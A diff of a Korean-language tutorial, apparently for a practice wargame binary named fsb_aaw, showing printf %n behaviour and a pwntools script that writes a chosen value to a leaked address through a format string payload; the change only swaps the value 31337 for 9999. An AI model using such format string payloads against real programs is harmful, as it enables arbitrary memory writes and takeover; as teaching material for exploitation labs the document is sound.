@@ -223,7 +223,7 @@ printf("AAAA%n", &a);    // a = 4
 printf("AAAA%1$n", &a);  // a = 4, 1번째 인자에 씀
 ```
 
-이를 바탕으로, Secret에 내가 원하는 31337이라는 값을 쓰는 코드를 작성해보자.
+이를 바탕으로, Secret에 내가 원하는 9999이라는 값을 쓰는 코드를 작성해보자.
 
 ```python
 from pwn import *
@@ -233,7 +233,7 @@ p = process('./fsb_aaw')
 p.recvuntil(b'`secret`: ')
 secret_addr = int(p.recvline()[:-1].decode(),16)
 
-fstring = b'%31337c%8$n'.ljust(16)
+fstring = b'%9999c%8$n'.ljust(16)
 fstring += p64(secret_addr)
 
 p.sendline(fstring)
